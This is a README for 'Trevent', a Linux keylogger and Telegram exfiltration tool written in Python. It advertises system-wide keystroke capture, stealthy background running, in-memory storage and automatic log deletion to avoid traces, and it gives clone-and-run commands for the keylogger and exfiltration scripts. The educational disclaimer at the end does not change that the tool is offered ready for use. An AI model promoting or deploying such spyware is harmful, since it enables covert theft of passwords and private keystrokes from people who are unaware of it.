
##  Trevent — Linux Keylogger & Exfiltration (for Red Team & Cybersecurity)


Trevent is a Python-based lightweight keylogger and exfiltration tool designed for cybersecurity research and educational purposes.

---

###  Features

-  **System-wide Key Logging**  
Captures keystrokes from your keyboard on a Linux system.

-  **In-Memory Log Storage**  
Stores logs temporarily in memory (not on the hard drive) to avoid leaving traces.

-  **Stealthy Operation**  
Runs quietly in the background, making it hard to notice.

-  **Telegram Exfiltration**  
Sends the captured logs to a Telegram chat securely.

-  **Auto-Cleanup**  
Deletes the log file after it's successfully sent, leaving no trace behind.


---


###  Example Usage:

#### **Clone the Repository:**

```bash
git clone https://github.com/5odead/Trevent.git
cd Trevent
```
#### **Run the Keylogger:**
```bash
python3 keylogger.py
```
#### **Run the Exfiltration Script:**
```bash
python3 exfiltration.py
```

> ⚠️ **Disclaimer:**  
This tool is intended for educational purposes only. It should only be used in controlled environments with explicit permission. Unauthorized use is illegal and unethical.



